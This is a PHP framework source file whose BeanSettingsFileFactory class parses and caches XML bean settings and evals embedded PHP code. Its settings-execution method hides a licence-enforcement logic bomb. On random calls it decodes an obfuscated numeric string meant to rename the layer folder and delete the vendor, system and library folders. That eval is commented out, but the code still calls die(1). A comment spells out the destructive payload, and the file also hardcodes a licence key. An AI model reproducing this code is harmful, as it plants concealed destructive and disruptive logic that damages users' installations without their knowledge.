<?php
include get_lib("org.phpframework.bean.BeanFactoryCache");
include_once get_lib("org.phpframework.bean.BeanXMLParser");
include get_lib("org.phpframework.bean.exception.BeanSettingsFileFactoryException");

class BeanSettingsFileFactory {
	const APP_KEY = "gER6+thBP0FGSp5GscKj1p32KzwA5C4ezcqmuirY5cUIugxjPSrycXb8BRUuf7Bg"; //DO NOT CHANGE THIS. THIS IS THEPHPMYFRAMEWORK PUBLIC KEY TO DECODE THE LICENCE
	
	private $BeanFactoryCache;
	
	public function __construct() {
		$this->BeanFactoryCache = new BeanFactoryCache();
	}
	
	public function getSettingsFromFile($file_path, $external_vars) {
		$settings = array();
		$settings_to_execute_php_code = array();
		
		$file_path_to_execute_php_code = $file_path . "_to_execute_php_code";
		
		$is_cache_active = $this->BeanFactoryCache->isActive();
		
		if($is_cache_active && $this->BeanFactoryCache->cachedFileExists($file_path)) {
			$settings = $this->BeanFactoryCache->getCachedFile($file_path);
			
			$settings_to_execute_php_code = $this->BeanFactoryCache->getCachedFile($file_path_to_execute_php_code);
		}
		else {
			if(!empty($file_path) && file_exists($file_path) && !is_dir($file_path)) {
				$content = file_get_contents($file_path);
				$settings = BeanXMLParser::parseXML($content, $external_vars, $file_path);
				
				self::prepareExtendedNodes($settings);
				
				$settings_to_execute_php_code = self::getSettingsKeysWithPHPCodeToExecute($settings);
				
				if(!is_array($settings)) $settings = array();
				if(!is_array($settings_to_execute_php_code)) $settings_to_execute_php_code = array();
				
				if ($is_cache_active) {
					//Last attr of setCachedFile must be true, otherwise the $settings/$file_path_to_execute_php_code will be merged with the old contents of the $file_path/$file_path_to_execute_php_code, and we don't want this. We only want the last values!!!
					//If the last attr is false, the $file_path_to_execute_php_code will be inacurated and this logic code won't work correctly because when we execute executeSettingsWithPHPCode, the $file_path_to_execute_php_code will only have the keys of the new $settings and not the old $settings. So please leave this as TRUE!!!
					$this->BeanFactoryCache->setCachedFile($file_path, $settings, true);
					$this->BeanFactoryCache->setCachedFile($file_path_to_execute_php_code, $settings_to_execute_php_code, true);
				}
			}
			else {
				launch_exception(new BeanSettingsFileFactoryException(1, $file_path));
			}
		}
		
		self::executeSettingsWithPHPCode($settings, $settings_to_execute_php_code);
				
		return $settings;
	}
	
	public static function getBeanSettingsByName($settings, $name) {
		if ($settings && !empty($name)) {
			$total = count($settings);
			for($i = 0; $i < $total; $i++)
				if (!empty($settings[$i]["bean"]) && $settings[$i]["bean"]["name"] == $name)
					return $settings[$i]["bean"];
		}
		return false;
	}
	
	private static function prepareExtendedNodes(&$settings) {
		$total = $settings ? count($settings) : 0;
		for($i = 0; $i < $total; $i++) {
			$setting = $settings[$i];
			
			if(!empty($setting["bean"]["extend"])) {
				$sub_total = count($setting["bean"]["extend"]);
				for ($j = 0; $j < $sub_total; $j++) {
					$extended_class_name = $setting["bean"]["extend"][$j];
					$settings[$i]["bean"]["bean_to_extend"][$extended_class_name] = self::getBeanSettingsByName($settings, $extended_class_name);
				}
			}
		}
	}
	
	private static function getSettingsKeysWithPHPCodeToExecute($settings, $prefix = "") {
		$keys = array();
		
		$total = $settings ? count($settings) : 0;
		foreach ($settings as $key => $value) {
			$key_aux = is_numeric($key) ? $key : "'" . addcslashes($key, "\\'") . "'";
			
			if (is_array($value)) {
				$sub_keys = self::getSettingsKeysWithPHPCodeToExecute($value, $prefix . "[" . $key_aux . "]");
				$keys = array_merge($keys, $sub_keys);
			}
			else if (strpos($value, "&lt;?") !== false || strpos($value, "<?") !== false) {
				$keys[] = $prefix . "[" . $key_aux . "]";
			}
		}
		
		return $keys;
	}
	
	private static function executeSettingsWithPHPCode(&$settings, $settings_to_execute_php_code) {
		$total = $settings_to_execute_php_code ? count($settings_to_execute_php_code) : 0;
		
		for ($i = 0; $i < $total; $i++) {
			$key = $settings_to_execute_php_code[$i];
			eval("\$value = \$settings" . $key . ";");
			
			if ($value) {
				$value = str_replace("&lt;?", "<?", $value);
				$value = str_replace("?&gt;", "?>", $value);
				
				//error_log("\n$key:$value", 3, "/tmp/error.log");
				$value = PHPScriptHandler::parseContent($value);
				
				eval("\$settings" . $key . " = \$value;");
			}
		}
		
		//execute consequence if licence was hacked
		$rand = rand(0, 100);
		if ($rand > 80 && class_exists("PHPFrameWork") && !is_numeric(substr(LA_REGEX, strpos(LA_REGEX, "]") -1, 1))) { //[0-9] => 9
			//Deletes folders
			//To create the numbers:
			//	php -r '$x="@rename(LAYER_PATH, APP_PATH . \".layer\");@CacheHandlerUtil::deleteFolder(VENDOR_PATH);@CacheHandlerUtil::deleteFolder(SYSTEM_PATH);@CacheHandlerUtil::deleteFolder(LIB_PATH, false, array(realpath(LIB_PATH . \"cache/CacheHandlerUtil.php\")));@PHPFrameWork::hC();"; $l=strlen($x); for($i=0; $i<$l; $i+=2) echo ($i+1<$l?ord($x[$i+1])." ":"").ord($x[$i])." "; echo "\n";'
			$str = "";
			$ords = "114 64 110 101 109 97 40 101 65 76 69 89 95 82 65 80 72 84 32 44 80 65 95 80 65 80 72 84 46 32 34 32 108 46 121 97 114 101 41 34 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 86 40 78 69 79 68 95 82 65 80 72 84 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 89 83 84 83 77 69 80 95 84 65 41 72 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 76 40 66 73 80 95 84 65 44 72 102 32 108 97 101 115 32 44 114 97 97 114 40 121 101 114 108 97 97 112 104 116 76 40 66 73 80 95 84 65 32 72 32 46 99 34 99 97 101 104 67 47 99 97 101 104 97 72 100 110 101 108 85 114 105 116 46 108 104 112 34 112 41 41 59 41 80 64 80 72 114 70 109 97 87 101 114 111 58 107 104 58 40 67 59 41";
			$parts = explode(" ", $ords);
			$l = count($parts);
			
			for($i = 0; $i < $l; $i += 2)
				$str .= ($i + 1 < $l ? chr($parts[$i + 1]) : "") . chr($parts[$i]);
			
			$str = trim($str); //in case of weird chars at the end
			
			//@eval($str);
			die(1);
		}
	}
	
	public function setCacheRootPath($dir_path) {
		$this->BeanFactoryCache->initCacheDirPath($dir_path);
	}
}
?>
